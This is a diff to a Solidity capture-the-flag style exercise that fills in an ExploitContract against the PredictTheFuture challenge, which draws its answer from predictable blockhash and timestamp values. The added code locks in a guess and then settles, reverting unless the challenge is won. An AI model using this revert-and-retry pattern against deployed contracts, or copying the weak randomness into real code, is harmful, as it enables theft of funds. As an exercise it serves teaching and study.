@@ -27,20 +27,11 @@ contract PredictTheFuture {
         require(msg.sender == guesser);
         require(block.number > settlementBlockNumber);
 
-        uint8 answer = uint8(
-            uint256(
-                keccak256(
-                    abi.encodePacked(
-                        blockhash(block.number - 1),
-                        block.timestamp
-                    )
-                )
-            )
-        ) % 10;
+        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
 
         guesser = address(0);
         if (guess == answer) {
-            (bool ok, ) = msg.sender.call{value: 2 ether}("");
+            (bool ok,) = msg.sender.call{value: 2 ether}("");
             require(ok, "Failed to send to msg.sender");
         }
     }
@@ -54,4 +45,14 @@ contract ExploitContract {
     }
 
     // Write your exploit code below
+    function lockInGuess(uint8 n) public payable {
+        predictTheFuture.lockInGuess{value: 1 ether}(n);
+    }
+
+    function settleChallenge() public payable {
+        predictTheFuture.settle();
+        require(predictTheFuture.isComplete(), "Wrong answer");
+    }
+
+    receive() external payable {}
 }
